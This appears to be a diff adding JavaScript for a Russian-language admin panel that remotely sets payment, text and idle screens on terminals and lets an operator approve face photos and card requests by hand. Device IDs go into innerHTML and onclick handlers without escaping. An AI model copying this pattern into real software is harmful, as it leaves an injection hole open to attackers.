+// ── Form fields visibility ────────────────────────────────────────────────
+function onStateChange() {
+  const s = document.getElementById('stateSelect').value;
+  document.getElementById('field_amount').style.display  = s === 'pay' ? 'block' : 'none';
+  document.getElementById('field_content').style.display = (s === 'payPending' || s === 'text') ? 'block' : 'none';
+  document.getElementById('field_buttons').style.display = s === 'buttons' ? 'block' : 'none';
+}
+
+// ── Send command ──────────────────────────────────────────────────────────
+async function sendCmd() {
+  const body = {
+    state:   document.getElementById('stateSelect').value,
+    amount:  document.getElementById('amount').value,
+    content: document.getElementById('content').value,
+    buttons: document.getElementById('buttons').value,
+  };
+
+  let url, label;
+  if (selectedTerminalId) {
+    url = '/admin/set_device_payload';
+    body.terminal_id = selectedTerminalId;
+    label = selectedTerminalId;
+  } else {
+    url = '/admin/set_payload';
+    label = 'все устройства';
+  }
+
+  try {
+    const r = await fetch(url, {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json', 'X-CSRF-Token': csrfToken},
+      body: JSON.stringify(body)
+    });
+    const d = await r.json();
+    if (d.success) {
+      toast(`✓ [${label}] → ${body.state}`, 'ok');
+      refreshStatus();
+    } else {
+      toast('✗ ' + d.error, 'err');
+    }
+  } catch(e) { toast('✗ ' + e.message, 'err'); }
+}
+
+// ── Reset all ─────────────────────────────────────────────────────────────
+async function resetAll() {
+  await fetch('/admin/reset', {method:'POST', headers: {'X-CSRF-Token': csrfToken}});
+  toast('↺ Все сброшены в idle', 'ok');
+  refreshStatus();
+}
+
+// ── Clear override for selected device ───────────────────────────────────
+async function clearOverride() {
+  if (!selectedTerminalId) return;
+  await fetch('/admin/clear_device_payload', {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json', 'X-CSRF-Token': csrfToken},
+    body: JSON.stringify({terminal_id: selectedTerminalId})
+  });
+  toast(`↺ Override снят с ${selectedTerminalId}`, 'ok');
+  refreshStatus();
+}
+
+// ── Face confirm toggle ───────────────────────────────────────────────────
+async function setFaceConfirm(enabled) {
+  try {
+    const r = await fetch('/admin/set_face_confirm', {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json', 'X-CSRF-Token': csrfToken},
+      body: JSON.stringify({enabled})
+    });
+    const d = await r.json();
+    faceConfirmEnabled = d.face_confirm_enabled;
+    toast(enabled ? '👤 Подтверждение лица включено' : '👤 Подтверждение лица выключено', 'ok');
+  } catch(e) { toast('✗ ' + e.message, 'err'); }
+}
+
+// ── Face confirm / reject ─────────────────────────────────────────────────
+async function confirmFace(terminalId, approved) {
+  try {
+    const r = await fetch('/admin/confirm_face', {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json', 'X-CSRF-Token': csrfToken},
+      body: JSON.stringify({terminal_id: terminalId, approved})
+    });
+    const d = await r.json();
+    toast(approved ? `✅ Оплата подтверждена [${terminalId}]` : `❌ Оплата отклонена [${terminalId}]`, approved ? 'ok' : 'err');
+    // Hide the face photo card
+    document.getElementById('facePhotoCard').style.display = 'none';
+    refreshStatus();
+  } catch(e) { toast('✗ ' + e.message, 'err'); }
+}
+
+async function confirmCard(terminalId, approved) {
+  try {
+    const r = await fetch('/admin/confirm_card', {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json', 'X-CSRF-Token': csrfToken},
+      body: JSON.stringify({terminal_id: terminalId, approved})
+    });
+    await r.json();
+    toast(approved ? `✅ Карта подтверждена [${terminalId}]` : `❌ Карта отклонена [${terminalId}]`, approved ? 'ok' : 'err');
+    refreshStatus();
+  } catch(e) { toast('✗ ' + e.message, 'err'); }
+}
+
+// ── Quick actions ─────────────────────────────────────────────────────────
+function quickPay(amt) {
+  document.getElementById('stateSelect').value = 'pay';
+  document.getElementById('amount').value = amt;
+  onStateChange(); sendCmd();
+}
+function quickPending() {
+  document.getElementById('stateSelect').value = 'payPending';
+  document.getElementById('content').value = 'Обрабатываем платёж...';
+  onStateChange(); sendCmd();
+}
+function quickText(t) {
+  document.getElementById('stateSelect').value = 'text';
+  document.getElementById('content').value = t;
+  onStateChange(); sendCmd();
+}
+function quickIdle() {
+  document.getElementById('stateSelect').value = 'idle';
+  onStateChange(); sendCmd();
+}
+
+// ── Status refresh ────────────────────────────────────────────────────────
+const stateClass = s => ({
+  idle:'idle', pay:'pay', payPending:'pending',
+  text:'text', buttons:'buttons', faceRecognition:'face'
+}[s] || 'idle');
+
+const stateLabel = s => ({
+  idle:'idle', pay:'pay 💳', payPending:'pending ⏳',
+  text:'text 📝', buttons:'buttons 🔘', faceRecognition:'face 👤'
+}[s] || s);
+
+function timeSince(iso) {
+  const secs = Math.floor((Date.now() - new Date(iso+'Z').getTime()) / 1000);
+  if (secs < 5)  return 'только что';
+  if (secs < 60) return secs + ' сек назад';
+  const m = Math.floor(secs/60);
+  if (m < 60)    return m + ' мин назад';
+  return Math.floor(m/60) + ' ч назад';
+}
+
+async function refreshStatus() {
+  try {
+    const r = await fetch('/admin/status');
+    if (r.status === 401) { window.location.href = '/login'; return; }
+    const d = await r.json();
+
+    // Global payload
+    document.getElementById('globalPayloadPre').textContent =
+      JSON.stringify(d.global_payload, null, 2);
+
+    // Face confirm toggle sync
+    if (typeof d.face_confirm_enabled === 'boolean') {
+      faceConfirmEnabled = d.face_confirm_enabled;
+      document.getElementById('faceConfirmToggle').checked = faceConfirmEnabled;
+    }
+
+    // Face photo cards — collect all devices with pending photos
+    const photoDevices = (d.devices || []).filter(dev => dev.face_photo && dev.face_photo.photo_b64);
+    const facePhotoCard = document.getElementById('facePhotoCard');
+    const facePhotoContent = document.getElementById('facePhotoContent');
+    if (photoDevices.length > 0) {
+      facePhotoCard.style.display = 'block';
+      // Only re-render buttons if the set of photos changed (new photo or photo removed)
+      // This prevents accidental clicks when innerHTML is replaced during refresh
+      const newFaceKeys = JSON.stringify(photoDevices.map(dev => ({
+        tid: dev.terminal_id,
+        at: dev.face_photo.received_at
+      })));
+      if (newFaceKeys !== lastFacePhotoKeys) {
+        lastFacePhotoKeys = newFaceKeys;
+        facePhotoContent.innerHTML = photoDevices.map(dev => {
+          const fp = dev.face_photo;
+          const timeStr = fp.received_at ? timeSince(fp.received_at) : '';
+          return `<div class="face-photo-block">
+            <img src="data:image/jpeg;base64,${fp.photo_b64}" alt="Фото лица">
+            <div class="face-time">📱 ${dev.terminal_id} · получено ${timeStr}</div>
+            <div class="face-btns">
+              <button class="btn btn-green" onclick="confirmFace('${dev.terminal_id}', true)">✅ Подтвердить</button>
+              <button class="btn btn-danger" onclick="confirmFace('${dev.terminal_id}', false)">❌ Отклонить</button>
+            </div>
+          </div>`;
+        }).join('');
+      }
+    } else {
+      lastFacePhotoKeys = '';
+      facePhotoCard.style.display = 'none';
+    }
+
+    // Card requests
+    const cardDevices = (d.devices || []).filter(dev => dev.card_request && !dev.card_request.confirmed_at);
+    const cardRequestCard = document.getElementById('cardRequestCard');
+    const cardRequestContent = document.getElementById('cardRequestContent');
+    if (cardDevices.length > 0) {
+      cardRequestCard.style.display = 'block';
+      const newCardKeys = JSON.stringify(cardDevices.map(dev => ({
+        tid: dev.terminal_id,
+        at: dev.card_request.received_at
+      })));
+      if (newCardKeys !== lastCardRequestKeys) {
+        lastCardRequestKeys = newCardKeys;
+        cardRequestContent.innerHTML = cardDevices.map(dev => {
+          const req = dev.card_request;
+          const timeStr = req.received_at ? timeSince(req.received_at) : '';
+          const source = req.source || 'card';
+          return `<div class="face-photo-block">
+            <div class="face-time">📱 ${dev.terminal_id} · источник: ${source} · получено ${timeStr}</div>
+            <div class="face-btns">
+              <button class="btn btn-green" onclick="confirmCard('${dev.terminal_id}', true)">✅ Подтвердить карту</button>
+              <button class="btn btn-danger" onclick="confirmCard('${dev.terminal_id}', false)">❌ Отклонить карту</button>
+            </div>
+          </div>`;
+        }).join('');
+      }
+    } else {
+      lastCardRequestKeys = '';
+      cardRequestCard.style.display = 'none';
+    }
+
+    devicesCache = d.devices || [];
+    renderDevicesSidebar();
+    renderPhonesStats(devicesCache);
+
+    // Connection indicator
+    document.getElementById('connDot').style.background = 'var(--green)';
+    document.getElementById('connText').textContent = 'онлайн';
+  } catch(e) {
+    document.getElementById('connDot').style.background = 'var(--red)';
+    document.getElementById('connText').textContent = 'нет связи';
+  }
+}
+
+// ── Attach device to current user ────────────────────────────────────────
+async function attachDevice() {
+  const terminalId = document.getElementById('attachTerminalId').value.trim();
+  const terminalPassword = document.getElementById('attachTerminalPassword').value.trim();
+  if (!terminalId || !terminalPassword) {
+    toast('✗ Введите terminal_id и пароль', 'err');
+    return;
+  }
+  try {
+    const r = await fetch('/admin/attach_device', {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json', 'X-CSRF-Token': csrfToken},
+      body: JSON.stringify({terminal_id: terminalId, terminal_password: terminalPassword})
+    });
+    const d = await r.json();
+    if (d.success) {
+      toast(`✓ ${terminalId} добавлен`, 'ok');
+      document.getElementById('attachTerminalId').value = '';
+      document.getElementById('attachTerminalPassword').value = '';
+      refreshStatus();
+    } else {
+      toast('✗ ' + (d.error || 'Ошибка'), 'err');
+    }
+  } catch(e) { toast('✗ ' + e.message, 'err'); }
+}
+
+// ── Toast ─────────────────────────────────────────────────────────────────
+let toastTimer;
+function toast(msg, type) {
+  const el = document.getElementById('toast');
+  el.textContent = msg;
+  el.className = 'toast show ' + (type === 'ok' ? 'ok' : 'err');
+  clearTimeout(toastTimer);
+  toastTimer = setTimeout(() => el.classList.remove('show'), 3000);
+}
+
+// ── Init ──────────────────────────────────────────────────────────────────
+selectGlobal();
+document.getElementById('globalBtn').innerText = role === 'admin' ? '🌐 Все устройства (глобально)' : '🌐 Все мои устройства';
+if (role !== 'admin') {
+  document.getElementById('attachDeviceBox').style.display = 'block';
+}
+onStateChange();
+refreshStatus();
+setInterval(refreshStatus, 2000);
+document.addEventListener('keydown', e => {
+  if (e.key === 'Escape') closeAllDevicesModal();
+});
+</script>
+</body>
+</html>
